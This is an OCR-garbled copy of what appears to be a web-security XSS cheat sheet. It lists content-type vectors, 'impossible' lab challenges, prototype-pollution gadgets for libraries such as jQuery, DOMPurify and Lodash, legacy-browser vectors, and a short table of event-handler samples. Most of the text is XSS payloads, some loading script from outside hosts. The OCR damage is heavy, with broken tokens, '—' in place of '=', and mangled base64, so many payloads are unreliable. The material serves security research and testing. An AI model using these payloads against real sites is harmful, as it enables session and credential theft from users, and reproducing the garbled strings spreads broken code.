Content-Type Browsers POC text/html (document . domain) application/xhtml+xml &lt; x: script xmlns : x— "http : / / www . w3 . org/ 1 g gg/xhtml "&gt;aLert (document . domain) &lt;/x : script&gt; : / / www . w3 . org/199Y/xhtm1 " >alert (document . domain) &lt; / x : script&gt; application/xml xmlns : x— "ht tp text/xml xmlns : : / / www . w3 . org/ 1999 / x html ">aLert (document . domain) &lt; / x: script &gt; image/svg+xml &lt; x: script xmlns : x— ' 'http / / www . w 3 . (documen L . domain) &lt; / x : script &gt; text/xsl : script xmlns : : / / www . w3 . org/ 1999 /xht_ml 'Wal ert (document . domain) : script > application/vnd.wap.xhtml+xml &lt; x: script xmlnG : ' 'ht Ep / / www . w 3 . (document . domain) : script&gt; text/rdf 8 •tx: script xmlns : : / / www . . org/1999./xht_ml " >alert. . domain) &lt; / x : script&gt; application/rdf+xml

```text
<x: script
```

xmlns : ' 'http

- / / www . w3 . org/ I g gg/xhtml ">aLert (document . domain) &lt;/x: script &gt;

- / / www . w3 . arg/ 199Y/xhtm1 " >alert (document . domain) : scrxpt>

application/mathml+xml : script xmlns : x— "http . text/vtt (document . ciamain) &lt; / script&gt; (document . domain ) &lt; / script&gt; text/cache-manifest

Response content types This section lists content-types that can be used for XSS when you can inject into the content-type header.

Content-Type Browsers PoC text/plain; x=x, text/html, foobar (document. domain) &lt; (document . domain) text/html xxx (document. domain) text/html xxx domain) &lt; / script&gt; text/html, xxx ( document . domain) text/html; xxx (document. domal n)

Impossible labs To find out what these are for, please refer to Documenting the impossible: Unexploitable XSS labs. TiUe Description Length Closest vector limit Basic context, WAF blocks This lab captures the scenario when you can't use an open tag followed by an alphanumeric N/A N/A <[a-zA-Z] character. Sometimes you can solve this problem by bypassing the WAF entirely, but what about when that's not an option? Certain versions of .NET have this behaviour, and it's only known to be exploitable in old IE with <%tag. Script based injection but We often encounter this situation in the wild: you have an injection inside a JavaScript N/A N/A quotes, forward slash and variable and can inject angle brackets, but quotes and forward/backslashes are escaped so backslash are escaped you can't simply close the script block.

The closest we've got to solving this is when you have multiple injection points. The first within a script based context and the second in HTML innerHTML context but no You have a site that processes the query string and URL decodes the parameters but splits equals allowed on the equals then assigns to innerHTML. In this context &lt;script&gt; doesn't work and we can't use = to create an event. Masato Kinugawa solved this lab and it is now fixed in Chrome. Basic context length limit This lab's injection occurs within the basic HTML context but has a length limitation of 15. 15

```text
<q oncut=alert••
```

Filedescriptor came up with a vector that could execute JavaScript in 16 characters: <q oncut=alert•• but can you beat it? Attribute context length The context of this lab inside an attribute with a length limitation of 14 characters. We came 14 "oncut=alert" limit up with a vector that executes JavaScript in 15 the plus is a trailing space. Do you think you can beat it? Basic context length limit, It's all well and good executing JavaScript but if all you can do is call alert what use is that? In 19 arbitrary code this lab we demonstrate the shortest possible way to execute arbitrary code. oncut=eval(name Attribute context length Again calling alert proves you can call a function but we created another lab to find the 17 See link limit arbitrary code shortest possible attribute based injection with arbitrary JavaScript. Injection occurs inside a We received a request from twitter about this next lab. It occurs within a frameset but before a N/A N/A frameset but before the body tag with equals filtered. You would think you could inject a closing frameset followed by a body script block but that would be too easy.

---

characters a-zO-9+'.' are can view the solution in the following post. allowed The double quote is encoded, the challenge is to find a way to execute XSS within a quoted N/A N/A Injection occurs inside double quoted src attribute src attribute. of a image element

Prototype pollution Library Payload Author Version Fingerprint Wistia Embedded

```text
<script>
```

William All return (typeof wistiaEmbeds !== 'undefined') Video Object. prototype . innerHTMTe — Bowling versions

&lt; / script &gt; $(x).off jQuery &lt; script&gt; Sergey return (typeof $ !== 'undefined' && typeof $.fn !== 'undi Bobrov versions && typeof $.fn.jquery !== 'undefined') Object . prototype . prevent Default— t xt,• Object . prototype ; Obj ect . prototype . delegaterrarget g/src/onerrar alert / * No extra code needed for jQuery 1 & 2 * / $ (document) . off foobar'); &lt; / script &gt; $(html) jQuery &lt; script &gt; Sergey return (typeof $ !== 'undefined' && typeof $.fn !== 'undi Bobrov versions && typeof $.fn.jquery !== 'undefined') Object . prototype . , '<img src onerror—alert

```text
</script><script>
```

$ ('&lt;div &lt; / script &gt; $.get jQuery Micha* 3.0 0 return (typeof $ !== 'undefined' && typeof $.fn L .--2 'undi &lt; script &gt; Bentkowski && typeof $.fn.jquery 'undefined') Object. prototype. url — ['data: , alert (1)//']; Object . prototype . data Type — script'; &lt; / script &gt; &lt; script &gt; $ . get ('https://google.corn/t); $ . post ( 'https://google.corn/t) &lt; / script &gt; $.getScript jQuery slrlus 3.4.o return (typeof $ !== 'undefined' && typeof $.fn . — 'undi Obj ect . prototype . src && typeof $.fn.jquery !== 'undefined') ['data: , alert (1) // ' &lt; / script &gt;

```text
<scripL>
```

$ . get Script ( 'https://google . com/ &lt; / script &gt; $.getScript jQuery slrlus 3.0.o return (typeof $ 'undefined' && typeof $.fn . -'undi 33.1 && typeof $.fn.jquery !== 'undefined') Object. prototype. url — 'data: , alert (1) // '

```text
</script>
```

```text
<script>
```

$ . get Script ( 'h Ltps: // google . com/ &lt; / script &gt; Google slrlus return (typeof recaptcha 'undefined') reCAPTCHA Obj ect . prototype . srcdoc=

&lt; / script &gt;

```text
<div data—
```

sitekey—"your site-key" / >

---

Object. prototype. hif — [ 'java script : alert (document . domain)

```text
</scripL>
```

Tealium Universal Sergey return (typeof utag !== 'undefined' && typeof utag.id Tag Bobrov 'undefined') Object . prototype. attrs — {src:l},• Object . prototype . src— ' https : / / port sw igger labs . net/xss/xss.j.s' &lt; / script &gt; Akamai . prototype . BOOMR — 1; slrlus return (typeof BOOMR !== 'undefined') Boomerang Obj ect . prototype . url= ' https : / / port sw igger labs . Lodash &lt; script &gt; Alex return (typeof _ !== 'undefined' && typeof _.template != 4.17.15 'undefined' typeof _.VERSION . 'undefined') Object . prototype. sourceURL — Brasetvik

&lt; / script &gt; &lt; scr ipt&gt; . template ('test') &lt; / script &gt; sanitize-html &lt; script &gt; Micha* return (typeof sanitizeHtml !== 'undefined') Bentkowski Object . prototype [ ] ['onload' &lt; / script &gt;

```text
<script>
```

document . write (sanitizeHtm1 ( ' &lt; If rame onload=alert (1) &gt; &lt; / script &gt; js-xss

```text
<script>
```

Micha} return (typeof filterXSS !== 'undefined') Bentkowski Object . prototype . whiteL1st — { Img : ['onerror', t src' &lt; / script &gt; &lt; script&gt; document. write (filterXSS (I &lt; i mg src onerror—alert &lt; / script &gt; DOMPurify Micha* 2.0.12 return (typeof DOMPurlfy .== 'undefined') Bentkowski Obj ect . prototype . ALLOWED ATTR - ['onerror', 'src' &lt; / script &gt;

document . write (DOMPurify . sanitize ( t &lt; img src onerror—amert &lt; / script&gt; DOMPurify

```text
<script>
```

Micha} 2.0.12 return (typeof DOMPurify 'undefined') Bentkowski Obj ect . prototype . documentMode 9 &lt; / script &gt; Closure Micha} return (typeof goog 'undefined' && typeof goog .bas &lt; script &gt; Bentkowski 'undefined')

```text
const html =
```

' &lt; img src onerror—alert (1)&gt;';

```text
const sanitizer
```

new goog . h Lml . saniLizer. HLm1SaniLizer ( ) ;

```text
const sanitized =
```

sanitizer . sanitize (html) ;

```text
const node
```

goog . dom . safeHtm1ToNode (sanitized) ;

document . body . append (node) ; &lt; / script &gt;

---

Obj ect . . CLOSURE BASE PATH - 'data: , alert (1) // &lt; / script &gt; Marionette.js /

```text
<script>
```

Sergey return (typeof Marionette !== 'undefined') return (typed Backbone.js Object . prototype . tagName — i mg' Bobrov Backbone !== 'undefined' && typeof Backbone.VERSl( 'undefined') Object . prototype . src Obj ect . prototype . onerror ('alert (1) &lt; / script &gt; &lt; script&gt; (function ( )

```text
var View = Mn. View. extend ( {template:
```

# template—layout' ) ) ;

```text
var App
```

Mn . Application . extend ( { region : '#app', onStart: function ( ) {this . showView (new View ( ) ) ,

```text
var app = new App ( ) ;
```

app. start ( ) ; no; &lt; / script &gt;

```text
<div
```

template/ underscore Adobe Dynamic &lt; script &gt; Sergey return (typeof satellite !== 'undefined') Tag Management Object . prototype data: , alert (1) Bobrov

&lt; / script &gt; Embedly Cards &lt; script&gt; Guilherme return (typeof window.embedly !== 'undefined') Keerok Object . prototype. onload — t alert (1) &lt; / script &gt; Segment Sergey return (typeof analytics !== 'undefined' && typeof

```text
<scr ipt>
```

Analytics.js Bobrov analytics.SNlPPET VERSION 'undefined') Object. prototype. script —

g/src/onerrar—alert (2) > &lt; / script &gt; Knockout.js Micha* &lt; strong 'hello' "&gt; Bentkowski &lt; / strong&gt; &lt; script &gt; Object. prototype [4] = "a' : 1, [alert (1) ) : 1, 'b" ; Object. prototype [5]

```text
</script><script>
```

ko . applyBindings ( { } ) &lt; / script &gt; $(x).on jQuery return (typeof $ !== 'undefined' && typeof $.fn !== 'undi &lt; script &gt; Andrei && typeof $.fn.jquery !== 'undefined') Object. prototype. on = Nicolaiciuc versions $ ('body') . on ('click'

```text
function ( )
```

alert ( ' Injected Event'); $ ('body') . trigger ('click'); &lt; / script &gt;

Classic vectors (XSS crypt)

Image src with JavaScript protocol &lt; img src ' 'java script: alert (1) "&gt;

Copy Link

---

Body background with JavaScript protocol

```text
<body (1) ">
```

Copy Link

'frame data ur's no longer work as modern browsers use a null origin < i frame text/ html, < img src—l onerror—alert (document . domain) Copy Link

VBScript protocol used to work in IE &lt; a :MsgBox+1 : Msgbox+l "&gt;XSS&lt;/a&gt; : Msgbox+l <a h : Msgbox+l <a h : Msgbox+l < a language=vbs : Msgbox+l Copy Link

JScript compact was a minimal version of JS that wasn't widely used in IE script. compact: alert (1) ; <a onclick " JSCRIPT . COMPACT : alert (1) ; Copy Link

JScript.Encode allows encoded JavaScript &lt; a language—I' JScript . Encode" &lt; a oncl ick=" JScript . Encode : . D 8 " a &gt; Copy Link

VBScript.Encoded allows encoded VBScript

```text
<iframe
```

< i frame language=VBScrupt . Encode

Copy Link

JavaScript entities used to work in Netscape Navigator

Copy Link

JavaScript stylesheets used to be supported by Netscape Navigator <1ink h ref=" xss . j s" rel stylesheet type "text/ jav Copy Link

---

< name=x

Copy Link

IE9 select elements and plaintext used to consume markup

&lt; form action=x&gt;&lt;button&gt;XSS&lt;/button&gt;&lt;se1ect name=x&gt;&lt;option&gt;&lt;plaintext&gt;&lt;script&gt;token="supersecret"&lt;/script&gt;

Copy Link

XBL Firefox only 2

```text
<div style ( / / business info. co. u k/ Labs/xbL/xb1 .xml#xss) "> <div
```

binding: url ( / / businessinfo. co.uk/labs/xbl/xbl.xml#xss) "> &lt;div style " 67 : ur L ( / / business info . co . u k/ Ia s/xbl/xbl. xml#xss) "&gt; &lt;div style " 67 : url ( / / businessinfo . co . u k/ 1 ab s/xbl/xbl . xml#xss) "&gt;

copy Link

XBL also worked in FF3.5 using data ur's

< img style—'t —moz—binding: url (data: text/ xml; charset—utf 8 , % 3C%3Fxm1 . http% 3A/ / www . mozilla . org/xbl%229ö3E963Cbinding9ä2 C

% 22 2 Ova 2 0 scr%2 . scr ipt % 22 20 scr . setAttribu te%28 % 22 src%2 2%2Cur1 % 2 var%2 document . get ElementsByTagName%2 22h tml *22±29. item* 2 8 C % 2 2 CbodyE1ement . appendChi ld%2 8 scr%2 3B%2 5

Copy Link

CSS expressions

```text
<div (alert (1)) > <div (1) —alert (1) > <div (alert (1
```

```text
<div (alert (1)) > <div (alert (1)) > <div
```

style—xss:expressio\6e (alert (1) ) > &lt;div style—xss 6e (alert (1) ) &gt;

Copy Link

In quirks mode IE allowed you to use = instead of :

```text
<div (alert (1)) > <div style
```

Copy Link

Behaviors for older modes of IE

```text
<a ; " (1) ">XSS</a>
```

Copy Link

Older versions of IE supported event handlers in functions

---

onerror=alert (1) > * / document.body . innerHTML ( ) &lt; / script &gt; &lt; / body &gt; &lt; script&gt; function document. body. inner HT T' &lt; img src=l onerror—alert (1) • } &lt; / script &gt; &lt;/body&gt; x Copy Link

GreyMagic HTML+time exploit (no longer works even in 5 docmode)

: namespace prefix—"t" namespace—"t" attributeName=" inner HTML" src=l onerror=alert (1) >"> &lt;/BODY&gt; &lt; / HTML&gt;

Copy Link

Firefox allows NULLS after &

```text
<a avascript:alert (1)
```

Copy Link

Firefox allows NULLs inside named entities

```text
<a alert (1) ">Firefox</a>
```

Copy Link

Firefox allows NULL characters inside opening comments

title—" (1) >">

Copy Link

Safari used to allow any tag to have a onload event inside SVG

```text
<svg><xss onload—alert (1) >
```

Copy Link

Isindex using src attribute

```text
<isxndex type=image src='
```

' // evil?

Copy Link

---

< is index type=submit value—XSS formaction "/ / evil?

Copy Link

Isindex and formaction

&lt; is index type—submit (1) &gt;

Copy Link

Isindex and action

```text
<isxndex type—submit action=j avascrxpt:alert (1) >
```

Copy Link

discard tag and onbegin

onbegin=alert (1) >

Copy Link

Use element with an external URL

```text
<svg><use href=" // subdomain 1 . port swigger labs . net/ use element/ upload.php#x"
```

svg>

Copy Link

onloadstart event for media elements in Firefox v107 and below

```text
<img src=validimage .png onloads tart=aiert (1) >
```

Copy Link

onloadend event for media elements in Firefox v107 and below

&lt; input type—image onloadend—alert (1) src=vaLidimage .png&gt;

Copy Link

onbounce event for marquee element in Firefox v125 and below

```text
<rnarquee width—I loop—I onbounce=alert (1)
```

Copy Link

---

```text
<marquee width—I loop 1 on finish alert (1)
```

Copy Link

onstart event for marquee element in Firefox v125 and below

```text
<marquee onstart=alert (1)
```

Copy Link

onshow event for menu element in Firefox v102 and below

```text
<div contextmenu=xss><p>Right click<menu type—context id—xss onshow—alert (1)
```

Copy Link

Assignable protocol with location

&lt; script&gt;location.protocol javascript ' &lt; / scrupt&gt;

Copy Link

Assignable protocol with anchor

(1) " onclick "protocol 'javascript '

Copy Link

Data URL with use element and base64 encoded

h re f— T' da ta : image / svg+xrnl ; base 6 4 , PEN 2 Z yBpZD0neCcgeG1 sbnM9 J2h0 dHA 6Ly93d3cudzMub3 JnL z IwMDAvc3ZnJyB4bWxuczp4bGI uaz 0 cDovL 3d3dy 53My5vcmcvMTk50S 94bG1uaycgd21 kdGg9JzEwMCcga GVpZ 2 h PS cxMDAn Pg08aW1 h Z 2 UgaHJ1 Z O iMS I gb2 51 cnJvcj O i YWx1 cnQ IC8+Cj wvc3ZnPg==#x" />&lt;/ svg&gt;

Copy Link

Data URL with use element

image/svg+xml, & It; svg u d— 'x' xmlns= 'http: // www.w3.org/2000/svg' &gt; &lt; image href—'l' /&gt; & It; / / > onerror=' alert (1) '

Copy Link

JavaScript protocol with new line

---

Copy Link

Base tag with JavaScript protocol rewriting relative URLS

```text
<base / a/ alert (1) href—.. / 101/ safari.
```

Copy Link

Object data attribute with JavaScript protocol in Firefox 140 and below

```text
<object data—I' java script: alert (1)
```

Copy Link

Embed src attribute with JavaScript protocol in Firefox 140 and below

```text
<embed (1) ">
```

Copy Link

Object data and codebase in Firefox v140 and below

```text
<object data* codebase—j avascript : alert (document . domain) // >
```

Copy Link

Embed src and codebase in Firefox v140 and below

```text
<embed src # codebase=j avascript : alert (document . domain) // >
```

Copy Link

Object data and codebase with single line comment in Firefox VI 40 and below

```text
<object data alert (1) codebase—j avascript: // >
```

Copy Link

Object data and codebase and hash bang in Firefox v140 and below

```text
<object alert (1) codebase—j avascrlpt : >
```

Copy Link

---

```text
<embed alert (1) codebase—java script: // >
```

Copy Link

Embed src and codebase and hash bang in Firefox v140 and below

```text
<embed alert (1) " codebase—j
```

Copy Link

window.name with onerror and throw on Firefox

onerror—eval, {lineNumber: 1, columnNumber: 1, f11eName : 1, message : name script >

Copy Link

SVG with onerror, throw and document.URL on Firefox

< svg top . onerror=evaL, {LineNumber:1, columnNumber:1, fileName: 1, message . . / * •FURL}

Copy Link

body with onerror, throw and location on Firefox

```text
<body onerror=eval, {11neNumber:1, columnNumber:1, fileName : 1, message: / * + location}
```

Copy Link

SVG use element Chrome/Firefox

```text
<svg><use <svg id='x' xmlns='http://www.w3.org/2000/svg'
```

xmlns :x1ink='http://www.w3.org/1999/xlink' width=' 10 0' height—'lC0 java script: alert (1) x y—'O' width—' 100 t height—' 100'

Copy Link

Animate tag with auto executing use element

```text
<svg><animate values—I' data : Image/svg+xrnl, & It; svg ld—tx'
```

xmlns='http://www.w3.org/2000/svg' &gt; &lt; image href='l' onerror—' alert (1) /&gt; & It; / svg&gt; {x" id—x / >

Copy Link

Fires before script is executed

onbeforescriptexecute=alert (1)

---

Link

Fires after script is executed onafterscriptexecute—alert (1) Copy Link

JavaScript URLs using navigation.navigate &lt; script&gt;navigatian . navigate ( ' java script : alert (1) ' ) &lt; / script &gt; Copy Link

Credits Brought to you by PortSwigger Research. Created by @garethheyes This cheat sheet wouldn't be possible without the web security community who share their research. Big thanks to: James Kettle, Mario Heiderich, Eduar Masato Kinugawa, Filedescriptor, LeverOne, Ben Hayak, Alex Inführ, Mathias Karlsson, Jann Horn, Ian Hickey, Gåbor Molnår, tsetnep, PsychOtrIa, Skyp Abdulrhman Alqabandi, brainpillow, Kyo, Yosuke Hasegawa, White Jordan, Algol, jackmasa, wpulog, Bolk, Robert Hansen, David Lindsay, Superhei, Micl Zalewski, Renaud Lifchitz, Roman Ivanov, Frederik Braun, Krzysztof Kotowicz, Giorgio Maone, GreyMagic, Marcus Niemietz, Soroush Dalili, Stefano Di F Roman Shafigullin, Lewis Ardern, Michal Bentkowski, SØPAS, avanish46, Juuso Käenmäki, jinm0123, itszn13, Martin Bajanik, David Granqvist, Andrea (theMiddle) Menin, simpsOn, hahwul, Pawel Haldrzyhski, Jun Kokatsu, RenwaX23, sratarun, harlsec, Yann C., gadhiyasavan, p4fg, diofeher, Sergey Bol

Begeek, Hannes Leopold, yawnmoth, Yair Amit, Franz Sedlmaier, Lukasz Pilorz, Steven Christey, Dan Crowley, Rene Ledosquet, Kurt Huwig, Moritz Nat Jonathan Vanasco, nEUrOO, Sec Consult, Timo, Ozh, David Ross, Lukasz Plonka (sp3x), xhzeem, Machlne, AmirMohammad Safari, Tom Schuster, Wc Filipnyquist, zhenwarx, smhtahsin33, Andrei Nicolaiciuc, Hiv01tag3, Andrej Simko, parrot409, terjanq, _Ox999, isacaya_, williamserizao, Mikhail Khramer soffensive, Muhammad Ahsan, Alessandro Rumampuk, Geetub, Skarn958 You can contribute to this cheat sheet by creating a new issue or updating the JSON and creating a pull request


## Verified event handler samples

These three source literals were visually checked; browser support icons and remaining payloads were not individually verified. Event names alone do not establish that an application has a vulnerable sink.

| Handler | Source description |
| --- | --- |
| `onpopstate` | Fires when the history changes |
| `onresize` | Fires when the window is resized |
| `onrepeat` | Fires when an SVG animation repeats |

```html
<body onpopstate=print()>
<body onresize="print()">
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
```
